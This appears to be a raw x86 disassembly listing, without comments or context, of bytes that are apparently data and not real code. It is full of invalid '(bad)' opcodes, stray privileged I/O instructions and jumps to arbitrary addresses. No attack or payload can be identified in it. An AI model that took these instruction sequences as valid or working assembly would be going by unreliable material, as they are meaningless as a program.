  42a961:	xchg   esi,eax
  42a962:	ud1    esi,DWORD PTR ds:0xfa6b3505
  42a969:	push   cs
  42a96a:	fsubrp st(2),st
  42a96c:	test   edx,edx
  42a96e:	or     DWORD PTR fs:[ebx],eax
  42a971:	inc    esi
  42a972:	stos   DWORD PTR es:[edi],eax
  42a973:	(bad)  
  42a974:	push   ebx
  42a975:	mov    ebx,0xe96ee8e4
  42a97a:	inc    ecx
  42a97b:	cmp    bl,BYTE PTR [ecx-0x38]
  42a97e:	sub    BYTE PTR [ebx-0x2bcf6aae],bh
  42a984:	es push ebp
  42a986:	pop    eax
  42a987:	cwde   
  42a988:	jb     0x42aa08
  42a98a:	mov    cl,0xea
  42a98c:	into   
  42a98d:	xor    BYTE PTR [edx-0x5c8aa975],dh
  42a993:	addr16 push cs
  42a995:	fiadd  DWORD PTR [esi+0x5e]
  42a998:	int3   
  42a999:	shr    DWORD PTR [ebp+0x79],0x2e
  42a99d:	cmp    dl,BYTE PTR [ecx+eiz*1]
  42a9a0:	xchg   esi,eax
  42a9a1:	in     eax,0x8
  42a9a3:	and    DWORD PTR [edx-0x44],edx
  42a9a6:	jns    0x42a9ef
  42a9a8:	adc    ch,BYTE PTR [esi+esi*1+0x52]
  42a9ac:	sbb    esi,DWORD PTR [eax+0x2]
  42a9af:	cmp    bh,bl
  42a9b1:	rcl    DWORD PTR [ebx+0xf2882d],0xbd
  42a9b8:	out    0x33,eax
  42a9ba:	mov    ecx,0x4b52d932
  42a9bf:	sbb    ebp,edx
  42a9c1:	jp     0x42a9d1
  42a9c3:	push   ss
  42a9c4:	gs push ds
  42a9c6:	enter  0x12c0,0x3d
  42a9ca:	cdq    
  42a9cb:	les    esi,FWORD PTR [edi+0x12]
  42a9ce:	mov    ecx,0x1cbc6dc3
  42a9d3:	pusha  
  42a9d4:	jge    0x42aa45
  42a9d6:	enter  0x76c5,0xba
  42a9da:	(bad)  
  42a9db:	je     0x42a99e
  42a9dd:	adc    eax,0xcd9a67c0
  42a9e2:	pop    ebp
  42a9e3:	jp     0x42a9b6
  42a9e5:	jne    0x42a9f8
  42a9e7:	lods   eax,DWORD PTR ds:[si]
  42a9e9:	lahf   
  42a9ea:	test   eax,0x13718c
	...
  42aa53:	add    BYTE PTR [eax],al
  42aa55:	add    BYTE PTR [eax+0x3fee1d93],ch
  42aa5b:	out    dx,al
  42aa5c:	sti    
  42aa5d:	xlat   BYTE PTR ds:[ebx]
  42aa5e:	in     eax,0xd3
  42aa60:	aad    0x7
  42aa62:	jmp    0x67c76862
  42aa67:	leave  
  42aa68:	add    DWORD PTR [eax],eax
  42aa6a:	add    BYTE PTR [ecx],al
  42aa6c:	add    BYTE PTR [eax],al
  42aa6e:	mov    cl,0xfe
  42aa70:	aaa    
  42aa71:	xor    DWORD PTR [esi+0x43],ebx
  42aa74:	jo     0x42aa58
  42aa76:	scas   eax,DWORD PTR es:[edi]
  42aa77:	stc    
  42aa78:	out    0xc0,eax
  42aa7a:	(bad)  [edi+0x17829b70]
  42aa80:	xchg   BYTE PTR [ebx-0x79],bh
  42aa83:	fadd   DWORD PTR [ebp+0x2f8f0a12]
  42aa89:	ror    DWORD PTR [edx+edx*4+0x2e6e4f58],1
  42aa90:	imul   esi,DWORD PTR [esi],0xbd765986
  42aa96:	xor    al,0xe2
  42aa98:	je     0x42aafb
  42aa9a:	push   ecx
  42aa9b:	cmc    
  42aa9c:	and    bh,BYTE PTR [ebp-0x2a4b940a]
  42aaa2:	mov    eax,0x47093ff3
  42aaa7:	pop    eax
  42aaa8:	call   0xf23f5fe0
  42aaad:	pop    ss
  42aaae:	xchg   edx,eax
  42aaaf:	sahf   
  42aab0:	adc    al,0x3c
  42aab2:	pop    eax
  42aab3:	jno    0x42aaa0
  42aab5:	cmc    
  42aab6:	mov    al,ds:0xcc5fc59b
  42aabb:	das    
  42aabc:	enter  0x60c9,0x53
  42aac0:	jg     0x42aaec
  42aac2:	xchg   esi,eax
  42aac3:	sar    al,1
  42aac5:	(bad)  
  42aac6:	xchg   BYTE PTR gs:[edi],ah
  42aac9:	jp     0x42aafb
  42aacb:	clc    
  42aacc:	adc    bh,BYTE PTR [edx]
  42aace:	jns    0x42aad4
  42aad0:	cmc    
  42aad1:	unpckhps xmm0,XMMWORD PTR [ebx+ecx*8]
  42aad5:	aas    
  42aad6:	jecxz  0x42aace
  42aad8:	rcl    BYTE PTR [ecx+0x2a],cl
  42aadb:	mov    ebx,0xfb04758c
  42aae0:	stc    
  42aae1:	test   BYTE PTR [ebx-0x57],0x21
  42aae5:	and    eax,0xd5c714ad
  42aaea:	mov    ebp,?
  42aaec:	xor    bl,ch
  42aaee:	ror    ebp,cl
  42aaf0:	stc    
  42aaf1:	mov    eax,0xcb9b678d
  42aaf6:	ret    0x1735
  42aaf9:	shl    eax,0x9c
  42aafc:	fsubr  QWORD PTR [ebp+0x6638cda8]
  42ab02:	mov    DWORD PTR [ecx+ebx*4+0x8],ebp
  42ab06:	cmp    esp,DWORD PTR [edx-0x38]
  42ab09:	les    esp,FWORD PTR [edx+edi*4]
  42ab0c:	add    ecx,eax
  42ab0e:	add    DWORD PTR [eiz*2-0x78d3c49a],0x35
  42ab16:	cmp    DWORD PTR [edi],edi
  42ab18:	(bad)  
  42ab19:	icebp  
  42ab1a:	dec    esp
  42ab1b:	div    DWORD PTR [edi+0x7de0af2c]
  42ab21:	pop    edi
  42ab22:	fst    QWORD PTR [edx-0x24]
  42ab25:	je     0x42ab35
  42ab27:	clc    
  42ab28:	or     ebp,edx
  42ab2a:	je     0x42ab8d
  42ab2c:	imul   ebx,DWORD PTR [edi-0x21],0xcc8c7f88
  42ab33:	push   ss
  42ab34:	cs mov ebp,0x1090a553
  42ab3a:	rol    BYTE PTR [ebx],1
  42ab3c:	ja     0x42aaee
  42ab3e:	and    al,0x60
  42ab40:	int    0xed
  42ab42:	mov    esp,0x7e80249a
  42ab47:	xchg   edx,eax
  42ab48:	in     eax,dx
  42ab49:	dec    ebp
  42ab4a:	or     DWORD PTR [ebx],edi
  42ab4c:	inc    esp
  42ab4d:	dec    ecx
  42ab4e:	mov    edx,0xcb3cf1bf
  42ab53:	xor    bl,BYTE PTR ss:[bx+si-0x60]
  42ab58:	out    dx,eax
  42ab59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ab5a:	sub    eax,0x4433c122
  42ab5f:	cmp    al,0xf4
  42ab61:	aas    
  42ab62:	in     al,0x8c
  42ab64:	sbb    cl,BYTE PTR fs:[ecx+0x72b2821f]
  42ab6b:	dec    esi
  42ab6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ab6d:	call   0x42ab72
	...
  42abd6:	ds push cs
  42abd8:	sub    al,0x5d
  42abda:	cmp    al,0x7f
  42abdc:	jg     0x42ac4d
  42abde:	and    BYTE PTR [eax],cl
  42abe0:	mov    dl,0x43
  42abe2:	ds cmp ebp,eax
  42abe5:	jmp    0x100:0x1ca67
  42abec:	add    BYTE PTR [eax],al
  42abee:	(bad)  
  42abef:	int3   
  42abf0:	jne    0x42ac11
  42abf2:	xchg   esp,eax
  42abf3:	xchg   ebx,eax
  42abf4:	cli    
  42abf5:	pop    edx
  42abf6:	dec    edi
  42abf7:	xchg   dl,al
  42abf9:	add    ebp,ebp
  42abfb:	jne    0x42ab9b
  42abfd:	call   0xb03c01be
  42ac02:	pop    esp
  42ac03:	mov    eax,ds:0x8743107b
  42ac08:	dec    eax
  42ac09:	xchg   ecx,eax
  42ac0a:	jbe    0x42abb1
  42ac0c:	(bad)  
  42ac0d:	xor    al,0x7
  42ac0f:	adc    eax,0xf6f6b45a
  42ac14:	pop    ds
  42ac15:	cld    
  42ac16:	popf   
  42ac17:	pop    eax
  42ac18:	inc    edx
  42ac19:	out    dx,al
  42ac1a:	test   eax,0x61019ca9
  42ac1f:	sub    eax,0xb7702dc1
  42ac24:	mov    ds:0x7cfac2e6,al
  42ac29:	test   BYTE PTR [ebp+0x19418ddf],ch
  42ac2f:	sub    DWORD PTR [eax+0x37],ecx
  42ac32:	push   ecx
  42ac33:	rcr    DWORD PTR [eax],1
  42ac35:	jo     0x42ac6f
  42ac37:	(bad)  
  42ac38:	sti    
  42ac39:	repnz test DWORD PTR [eax+0x14a5ae45],0xabd90cb0
  42ac44:	mov    cs,WORD PTR [ebx+0x7b]
  42ac47:	(bad)  
  42ac48:	sbb    eax,0x37ce3c2e
  42ac4d:	fnstcw WORD PTR [ebx+0x68077ed8]
  42ac53:	sub    bh,BYTE PTR [edx+0x715c1932]
  42ac59:	cli    
  42ac5a:	dec    eax
  42ac5b:	dec    edi
  42ac5c:	aam    0x1e
  42ac5e:	jne    0x42ac02
  42ac60:	fisttp WORD PTR [esi+0x4c]
  42ac63:	jecxz  0x42acb2
  42ac65:	ins    DWORD PTR es:[edi],dx
  42ac66:	inc    edx
  42ac67:	call   0x69db9adf
  42ac6c:	in     al,dx
  42ac6d:	mov    dh,0x8a
  42ac6f:	bound  eax,QWORD PTR [edi+0x26a0e218]
  42ac75:	and    ecx,esi
  42ac77:	arpl   cx,ax
  42ac79:	aam    0x9e
  42ac7b:	sub    al,0x99
  42ac7d:	push   edi
  42ac7e:	xchg   ebx,eax
  42ac7f:	dec    ecx
  42ac80:	push   0x78
  42ac82:	adc    eax,0x17515657
  42ac87:	ss mov edx,0xb9d6055f
  42ac8d:	mov    ebx,0x400ec158
  42ac92:	jnp    0x42acb0
  42ac94:	dec    eax
  42ac95:	push   edx
  42ac96:	mov    bh,0x8b
  42ac98:	les    eax,FWORD PTR [eax-0x1f]
  42ac9b:	mov    DWORD PTR [edi+0x187dd8e9],edi
  42aca1:	mov    BYTE PTR [edx],dh
  42aca3:	test   DWORD PTR [ecx+0x3cd6a18a],ecx
  42aca9:	lds    esp,FWORD PTR [edx+0x75]
  42acac:	aas    
  42acad:	xchg   edi,eax
  42acae:	call   0xf139:0x6634a0b2
  42acb5:	jo     0x42aca4
  42acb7:	enter  0x8b10,0xe
  42acbb:	sub    DWORD PTR [ebx],ebx
  42acbd:	xchg   edx,eax
  42acbe:	cmc    
  42acbf:	jns    0x42ac79
  42acc1:	mov    ss,ecx
  42acc3:	push   eax
  42acc4:	mov    al,0xbb
  42acc6:	repz adc bl,BYTE PTR [ecx-0x44]
  42acca:	mov    ah,dh
  42accc:	jbe    0x42ace7
  42acce:	lahf   
  42accf:	cs mov edx,0x7d1ddcb7
  42acd5:	mov    gs,WORD PTR [ebx]
  42acd7:	and    DWORD PTR [edx-0x23aedd62],esi
  42acdd:	xor    esi,edx
  42acdf:	mov    BYTE PTR [ecx-0x21],dl
  42ace2:	sub    DWORD PTR [ecx-0x7646d973],ecx
  42ace8:	push   ebp
  42ace9:	or     esi,esi
  42aceb:	ret    0x38ef
	...
  42ad56:	jmp    0xdf7cc98d
  42ad5b:	ds out dx,eax
  42ad5d:	repz ret 
  42ad5f:	fcom   DWORD PTR [edx+0x72]
  42ad62:	or     BYTE PTR [ecx],cl
  42ad64:	xchg   esi,eax
  42ad65:	mov    BYTE PTR [edi-0x35],ah
  42ad68:	add    DWORD PTR [eax],eax
  42ad6a:	add    BYTE PTR [ecx],al
  42ad6c:	add    BYTE PTR [eax],al
  42ad6e:	ficom  DWORD PTR ds:0x5f31f6b
  42ad74:	or     al,0xf4
  42ad76:	addr16 xor cl,0x45
  42ad7a:	out    0xd0,al
  42ad7c:	push   0x8111d3bb
  42ad81:	les    esp,FWORD PTR [ebp+ebx*2+0x413a4856]
  42ad88:	seta   al
  42ad8b:	nop
  42ad8c:	sbb    DWORD PTR [esi+0x7643884d],edx
  42ad92:	pushf  
  42ad93:	or     bl,BYTE PTR [esi+0x3c9631d6]
  42ad99:	fs xor eax,0x1cca6d37
  42ad9f:	sbb    BYTE PTR [ecx+0x39],ah
  42ada2:	xor    al,0x3b
  42ada4:	shr    DWORD PTR [esp+eiz*2+0x4f],0xc6
  42ada9:	test   DWORD PTR [edx+0x290176ac],ebx
  42adaf:	(bad)
  42adb2:	fisub  WORD PTR es:[eax-0x7885c3f5]
  42adb9:	ficomp DWORD PTR [ebp+ebp*1+0x4d]
  42adbd:	ss mov ebp,0xc9edb99d
  42adc3:	rol    BYTE PTR [ebx+0x5d3c4902],1
  42adc9:	pop    esp
  42adca:	das    
  42adcb:	jge    0x42ae37
  42adcd:	fcomp  DWORD PTR [edx-0x7b]
  42add0:	retf   0x94b1
  42add3:	dec    ebx
  42add4:	ins    BYTE PTR es:[edi],dx
  42add5:	loope  0x42adb9
  42add7:	pop    ss
  42add8:	and    BYTE PTR [edi+0x16],dl
  42addb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42addc:	pop    ds
  42addd:	pusha  
  42adde:	enter  0xd82b,0xb7
  42ade2:	retf   0xc898
  42ade5:	ret    
  42ade6:	xchg   ecx,eax
  42ade7:	mov    ebx,0x4c1ebdd1
  42adec:	clc    
  42aded:	rol    edi,1
  42adef:	lahf   
  42adf0:	(bad)  [edx+ebx*4+0x6]
  42adf4:	imul   eax,DWORD PTR [esi],0x12
  42adf7:	iret   
  42adf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42adf9:	jno    0x42ad9c
  42adfb:	xchg   esi,eax
  42adfc:	test   eax,0x385cbb96
  42ae01:	jg     0x42ae65
  42ae03:	unpcklps xmm1,XMMWORD PTR [ecx-0x7a]
  42ae07:	div    DWORD PTR [esi+0x3f]
  42ae0a:	retf   0xb752
  42ae0d:	mov    esp,DWORD PTR [ecx+eiz*4+0x42803be4]
  42ae14:	mov    ch,0x18
  42ae16:	fwait
  42ae17:	fwait
  42ae18:	shr    BYTE PTR [edx],0xda
  42ae1b:	jo     0x42adc4
  42ae1d:	jecxz  0x42ae97
  42ae1f:	clc    
  42ae20:	pop    eax
  42ae21:	jle    0x42ae76
  42ae23:	add    BYTE PTR [ebx-0x70],dl
  42ae26:	pop    ss
  42ae27:	mov    bl,0x4d
  42ae29:	mov    edi,0x77b027ad
  42ae2e:	fistp  WORD PTR [edi]
  42ae30:	xchg   esp,eax
  42ae31:	xchg   bh,ch
  42ae33:	xchg   ebx,eax
  42ae34:	jmp    0x42adcf
  42ae36:	nop
  42ae37:	out    dx,al
  42ae38:	fwait
  42ae39:	in     al,dx
  42ae3a:	sbb    DWORD PTR [ecx-0x4a],ebx
  42ae3d:	aam    0xab
  42ae3f:	xchg   edi,eax
  42ae40:	jmp    0x42adfa
  42ae42:	leave  
  42ae43:	mov    dl,0xed
  42ae45:	mov    ebp,0xc61fa44f
  42ae4a:	sti    
  42ae4b:	ret    
  42ae4c:	cli    
  42ae4d:	sub    BYTE PTR [eax],cl
  42ae4f:	sub    DWORD PTR [edx-0x72915751],edx
  42ae55:	mov    DWORD PTR [edi],0xb3afea69
  42ae5b:	popf   
  42ae5c:	add    ebx,esp
  42ae5e:	and    dl,BYTE PTR [edi-0x39]
  42ae61:	push   ds
  42ae62:	mov    ah,0x5c
  42ae64:	dec    esp
  42ae65:	ja     0x42aec1
  42ae67:	mov    al,ds:0xe5003e35
  42ae6c:	sti    
  42ae6d:	xchg   ebx,eax
	...
  42aed6:	mov    edi,0x4a8e4af7
  42aedb:	mov    edi,0x7bd8f7ff
  42aee0:	mov    dh,0xb9
  42aee2:	aas    
  42aee3:	mov    al,0x3e
  42aee5:	mov    bh,0x67
  42aee7:	int3   
  42aee8:	add    DWORD PTR [eax],eax
  42aeea:	add    BYTE PTR [ecx],al
  42aeec:	add    BYTE PTR [eax],al
  42aeee:	add    bh,BYTE PTR [ebp+0x26119e1f]
  42aef4:	scas   eax,DWORD PTR es:[edi]
  42aef5:	dec    ecx
  42aef6:	loopne 0x42af0e
  42aef8:	outs   dx,BYTE PTR ds:[esi]
  42aef9:	mov    esi,0xd643ef73
  42aefe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42aeff:	rcr    BYTE PTR ds:0x591042c5,0x10
  42af06:	scas   al,BYTE PTR es:[edi]
  42af07:	test   DWORD PTR [edx],0x5dca69a1
  42af0d:	push   edi
  42af0e:	pop    edi
  42af0f:	sahf   
  42af10:	je     0x42aeaf
  42af12:	call   0x155:0x4ef86716
  42af19:	inc    ebp
  42af1a:	mov    bl,0x32
  42af1c:	sub    BYTE PTR [edi+0x187aba20],0x88
  42af23:	retf   
  42af24:	pop    edx
  42af25:	mov    ebx,0xfc76aefb
  42af2a:	jge    0x42af0f
  42af2c:	and    DWORD PTR [edx],edx
  42af2e:	repz ror BYTE PTR [esi+eiz*8+0x5c],cl
  42af33:	mov    ah,0x91
  42af35:	out    dx,eax
  42af36:	fidiv  DWORD PTR [ecx-0x60]
  42af39:	lea    esi,[edx+0xc]
  42af3c:	repnz pop ss
  42af3e:	out    0x4c,eax
  42af40:	in     eax,0x5a
  42af42:	mov    edx,0xc6684782
  42af47:	inc    ebp
  42af48:	cmp    dl,BYTE PTR [esi+0xbf85e76]
  42af4e:	mov    al,ds:0xb09437fe
  42af53:	inc    edx
  42af54:	add    eax,0x5826eb45
  42af59:	jmp    0xfb74be7
  42af5e:	sbb    BYTE PTR [eax-0x60],dh
  42af61:	pop    ss
  42af62:	clc    
  42af63:	cmp    cl,bh
  42af65:	push   0xffffffa6
  42af67:	mov    eax,0xcaac45ae
  42af6c:	(bad)
  42af6f:	test   al,0x84
  42af71:	pop    ebx
  42af72:	aad    0x2a
  42af74:	add    eax,0x14bc2135
  42af79:	inc    ebx
  42af7a:	xchg   esp,eax
  42af7b:	sub    BYTE PTR [eax+edi*4+0x6b7ee236],0x70
  42af83:	scas   eax,DWORD PTR es:[edi]
  42af84:	nop
  42af85:	jp     0x42af99
  42af87:	jmp    FWORD PTR [esi]
  42af89:	xchg   edi,eax
  42af8a:	popa   
  42af8b:	xchg   ebp,eax
  42af8c:	push   0x4d823704
  42af91:	pop    esi
  42af92:	test   al,0xae
  42af94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42af95:	sub    bh,BYTE PTR [esi+edi*1-0x2cc07a9d]
  42af9c:	les    eax,FWORD PTR [ebx+edi*8]
  42af9f:	xchg   dh,dh
  42afa1:	or     DWORD PTR [ebx],eax
  42afa3:	popf   
  42afa4:	call   0x6980:0x5ebff54c
  42afab:	pop    esp
  42afac:	cmp    dl,BYTE PTR [ebx]
  42afae:	nop
  42afaf:	and    ecx,DWORD PTR [esi+0x69]
  42afb2:	shr    dh,cl
  42afb4:	lds    eax,FWORD PTR [eax+0x1c055df2]
  42afba:	fwait
  42afbb:	scas   al,BYTE PTR es:[edi]
  42afbc:	mov    edx,0x1ba4dda1
  42afc1:	push   edx
  42afc2:	xor    BYTE PTR [esi-0x19],ah
  42afc5:	jo     0x42afba
  42afc7:	adc    eax,0xd57136d9
  42afcc:	pushf  
  42afcd:	lds    ebp,FWORD PTR [ecx]
  42afcf:	inc    edx
  42afd0:	dec    esp
  42afd1:	cli    
  42afd2:	lds    esp,FWORD PTR [edx]
  42afd4:	sub    dh,BYTE PTR [edi+0x6e2394b3]
  42afda:	shr    ch,0xeb
  42afdd:	lods   al,BYTE PTR ds:[esi]
  42afde:	out    dx,eax
  42afdf:	add    BYTE PTR [esi+edx*2+0x1],al
  42afe3:	push   edx
  42afe4:	imul   ecx,DWORD PTR [edi-0x1ce57a33],0x57eeee07
	...
  42b056:	stc    
  42b057:	enter  0xdc7a,0x7b
  42b05b:	(bad)  
  42b05c:	(bad)  
  42b05d:	in     eax,dx
  42b05e:	sbb    al,0x4f
  42b060:	push   ebp
  42b061:	inc    esp
  42b062:	daa    
  42b063:	(bad)  
  42b066:	addr16 int 0x1
  42b069:	add    BYTE PTR [eax],al
  42b06b:	add    DWORD PTR [eax],eax
  42b06d:	add    BYTE PTR [ebx],ah
  42b06f:	lods   al,BYTE PTR ds:[esi]
  42b070:	pop    edx
  42b071:	or     edi,DWORD PTR [esi+eax*8+0x794e93b7]
  42b078:	lock push cs
  42b07a:	(bad)  
  42b07b:	xor    ecx,edi
  42b07d:	add    DWORD PTR [ecx-0x63],edi
  42b080:	test   DWORD PTR [edx-0x14],esp
  42b083:	out    0x61,eax
  42b085:	rol    ah,cl
  42b087:	mov    eax,0x268f3d9d
  42b08c:	rcl    BYTE PTR [ecx+0x2fa70901],0xaa
  42b093:	mov    ah,0x9f
  42b095:	fist   WORD PTR [esi+0x7dff11fc]
  42b09b:	mov    ecx,0xf2d882d5
  42b0a0:	xchg   edi,eax
  42b0a1:	in     eax,0x32
  42b0a3:	test   eax,0x4a887dbd
  42b0a8:	mov    ebx,0x4ae7ab15
  42b0ad:	scas   eax,DWORD PTR es:[edi]
  42b0ae:	xchg   BYTE PTR [esi-0x671d6493],ah
  42b0b4:	inc    edi
  42b0b5:	fwait
  42b0b6:	xchg   ebx,eax
  42b0b7:	stos   DWORD PTR es:[edi],eax
  42b0b8:	jo     0x42b075
  42b0ba:	ja     0x42b0d2
  42b0bc:	pop    ebx
  42b0bd:	aad    0x2d
  42b0bf:	add    bh,BYTE PTR [esi+edx*1-0x7ef4166f]
  42b0c6:	pop    edx
  42b0c8:	loopne 0x42b069
  42b0ca:	inc    edx
  42b0cb:	sub    BYTE PTR [ebx-0x7b96a3b5],ah
  42b0d1:	call   0xfb8f2c40
  42b0d6:	jne    0x42b0f2
  42b0d8:	pusha  
  42b0d9:	xor    al,0x98
  42b0db:	(bad)  
  42b0dd:	(bad)  
  42b0de:	in     al,0x17
  42b0e0:	add    BYTE PTR ds:[ebx+0x1a],ch
  42b0e4:	inc    ebx
  42b0e5:	adc    eax,0x12e95b2f
  42b0ea:	daa    
  42b0eb:	xor    bl,bl
  42b0ed:	js     0x42b08b
  42b0ef:	jo     0x42b07c
  42b0f1:	popa   
  42b0f2:	xor    eax,0x5b16fee
  42b0f7:	jnp    0x42b09a
  42b0f9:	inc    ecx
  42b0fa:	xor    ebp,edx
  42b0fc:	js     0x42b0ac
  42b0fe:	int3   
  42b0ff:	scas   eax,DWORD PTR es:[edi]
  42b100:	into   
  42b101:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b102:	aas    
  42b103:	pop    esp
  42b104:	popa   
  42b105:	or     ebx,edi
  42b107:	mov    DWORD PTR [edx-0x16532453],0x5cc39ea9
  42b111:	ja     0x42b0b3
  42b113:	add    cl,ah
  42b115:	aam    0x42
  42b117:	xor    dh,bl
  42b119:	pop    edi
  42b11a:	pop    ss
  42b11b:	push   0x4e
  42b11d:	sar    BYTE PTR [edx+0x750f6557],1
  42b123:	ja     0x42b0b7
  42b125:	das    
  42b126:	test   eax,0xce98b654
  42b12b:	push   eax
  42b12c:	imul   BYTE PTR [ebx]
  42b12e:	imul   DWORD PTR [esp+edi*4]
  42b131:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b132:	mov    dh,0xf7
  42b134:	jno    0x42b137
  42b136:	cmp    al,0x29
  42b138:	xchg   DWORD PTR [ebx-0x7c],esp
  42b13b:	test   DWORD PTR [ecx-0x33],0x89ab21b7
  42b142:	mov    bh,0x9f
  42b144:	and    DWORD PTR [edx],0xffffffcb
  42b147:	xor    DWORD PTR [edi],eax
  42b149:	sahf   
  42b14a:	je     0x42b127
  42b14c:	xor    BYTE PTR [edi-0x32],bh
  42b14f:	in     al,dx
  42b150:	dec    ebx
  42b151:	mov    eax,0xca0d6a4e
  42b156:	test   BYTE PTR [ebx+0x44],ah
  42b159:	sub    esp,DWORD PTR [ecx]
  42b15b:	push   cs
  42b15c:	test   dl,al
  42b15e:	arpl   WORD PTR [ebp-0x11],sp
  42b161:	ins    WORD PTR es:[edi],dx
  42b163:	test   BYTE PTR ds:0x6b1539ca,0x49
  42b16a:	fs fadd st(3),st
  42b16d:	inc    edx
	...
  42b1d6:	jne    0x42b1fd
  42b1d8:	imul   ebx,DWORD PTR [edi-0x51]
  42b1dc:	cmc    
  42b1dd:	call   eax
  42b1df:	inc    ebx
  42b1e0:	push   edi
  42b1e1:	popa   
  42b1e2:	mov    ds:0x67bcab53,eax
  42b1e7:	into   
  42b1e8:	add    DWORD PTR [eax],eax
  42b1ea:	add    BYTE PTR [ecx],al
  42b1ec:	add    BYTE PTR [eax],al
  42b1ee:	fimul  DWORD PTR [ebx*2+0x60822d54]
  42b1f5:	adc    BYTE PTR [ecx+esi*4],al
  42b1f8:	xor    eax,0xffffff9b
  42b1fb:	add    dh,BYTE PTR [edi+0xb891ca6]
  42b201:	sbb    ch,BYTE PTR [esp+edx*2]
  42b204:	and    al,0xde
  42b206:	mov    ebx,0xab9b52c8
  42b20b:	mov    edi,0xda7fa393
  42b210:	mov    WORD PTR [edx+0x3f],ds
  42b213:	mov    ch,0xf
  42b215:	jmp    0x42b216
  42b217:	loope  0x42b21c
  42b219:	call   0x2ba3:0x7f8a49ae
  42b220:	jne    0x42b1d9
  42b222:	sahf   
  42b223:	push   ebx
  42b224:	cwde   
  42b225:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b226:	int    0x20
  42b228:	add    ch,BYTE PTR [ebx+ebp*2+0x1a850022]
  42b22f:	ins    BYTE PTR es:[edi],dx
  42b230:	ins    DWORD PTR es:[edi],dx
  42b231:	or     eax,0x1e8e3ca2
  42b236:	bound  ecx,QWORD PTR [ecx+eax*8-0x6b]
  42b23a:	jbe    0x42b285
  42b23c:	les    eax,FWORD PTR [edi-0x2d011bfb]
  42b242:	(bad)  [edi+0x3cbf2252]
  42b248:	sub    DWORD PTR [edx+0xa2abd78],ebx
  42b24e:	xchg   edx,eax
  42b24f:	(bad)  
  42b250:	cmp    al,0x18
  42b252:	(bad)  
  42b254:	cmp    DWORD PTR [esi+eiz*1+0x21],esp
  42b258:	jle    0x42b233
  42b25a:	loope  0x42b247
  42b25c:	push   cs
  42b25d:	inc    esp
  42b25e:	pusha  
  42b25f:	shl    DWORD PTR [edx],1
  42b261:	jp     0x42b2cf
  42b263:	xor    esp,DWORD PTR [edx+ebx*8+0x11]
  42b267:	add    BYTE PTR [edx+0x1ac6c287],bl
  42b26d:	shl    ah,0x27
  42b270:	fbld   TBYTE PTR [ebx-0x23]
  42b273:	call   0x2f2cb2c5
  42b278:	scas   al,BYTE PTR es:[edi]
  42b279:	cmp    al,0xbe
  42b27b:	imul   edx,esi,0x22
  42b27e:	adc    DWORD PTR ds:0xa753d18,esp
  42b284:	jecxz  0x42b22f
  42b286:	ret    
  42b287:	and    ch,BYTE PTR [ebx]
  42b289:	aam    0xf7
  42b28b:	xchg   edi,eax
  42b28c:	xor    dl,BYTE PTR [ebp+0x73]
  42b28f:	fisub  DWORD PTR [ebx]
  42b291:	xchg   edx,eax
  42b292:	dec    eax
  42b293:	aas    
  42b294:	pop    eax
  42b295:	fcom   QWORD PTR [edi]
  42b297:	xor    eax,0x3944d30d
  42b29c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b29d:	mov    ecx,0x3bd1b3f4
  42b2a2:	sbb    BYTE PTR [ecx],0xdf
  42b2a5:	fnstenv [ebx-0x6d]
  42b2a8:	mov    BYTE PTR [ecx+0x16],bh
  42b2ab:	and    bl,BYTE PTR [edx+0x5]
  42b2ae:	dec    ebx
  42b2af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b2b0:	mov    eax,0x364d6a32
  42b2b5:	stc    
  42b2b6:	jl     0x42b2d4
  42b2b8:	fldcw  WORD PTR [ebx]
  42b2ba:	ds dec esi
  42b2bc:	cmp    al,cl
  42b2be:	int3   
  42b2bf:	out    0x4c,eax
  42b2c1:	cmp    eax,0xa6480073
  42b2c6:	mov    cl,0x7e
  42b2c8:	mov    WORD PTR [edx],gs
  42b2ca:	(bad)  
  42b2cb:	adc    dh,BYTE PTR [edx]
  42b2cd:	dec    esp
  42b2ce:	cmp    DWORD PTR [edi+0x25],ebx
  42b2d1:	div    BYTE PTR [esi+eiz*4+0x6d]
  42b2d5:	fidivr DWORD PTR [ebp-0x55]
  42b2d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b2d9:	mov    esi,0x32f7b752
  42b2de:	lods   al,BYTE PTR ds:[esi]
  42b2df:	hlt    
  42b2e0:	mov    edi,0xa4864f1
  42b2e5:	pusha  
  42b2e6:	ins    DWORD PTR es:[edi],dx
  42b2e7:	pop    esp
  42b2e8:	nop
  42b2e9:	test   eax,0xa6a5fc5a
	...
  42b356:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b357:	mov    ds,WORD PTR [ecx-0x28844a0]
  42b35d:	iret   
  42b35e:	sub    eax,0xbd738e65
  42b363:	jecxz  0x42b382
  42b365:	dec    ebx
  42b366:	addr16 iret 
  42b368:	add    DWORD PTR [eax],eax
  42b36a:	add    BYTE PTR [ecx],al
  42b36c:	add    BYTE PTR [eax],al
  42b36e:	push   ss
  42b36f:	in     al,0x83
  42b371:	aaa    
  42b372:	(bad)  [ebx+0x61]
  42b375:	xchg   ecx,eax
  42b376:	dec    edx
  42b377:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b378:	cmp    esp,DWORD PTR ds:[esp+ecx*8+0x79]
  42b37d:	fld    QWORD PTR [esi-0x2e22963b]
  42b383:	xchg   edx,eax
  42b384:	push   ecx
  42b385:	mov    eax,ds:0xd29a339
  42b38a:	mov    eax,ds:0x97662328
  42b38f:	lods   al,BYTE PTR ds:[esi]
  42b390:	mov    DWORD PTR [edx],ebx
  42b392:	cmp    DWORD PTR [edi-0x37],esi
  42b395:	fimul  WORD PTR ds:0x14195dbf
  42b39b:	mov    eax,ds:0x294f2a5e
  42b3a0:	push   eax
  42b3a1:	and    DWORD PTR [eax-0x2f827a41],edi
  42b3a7:	mov    cl,0xaf
  42b3a9:	lea    esi,[ebp+0x70]
  42b3ac:	cs test eax,0x7d9b58f4
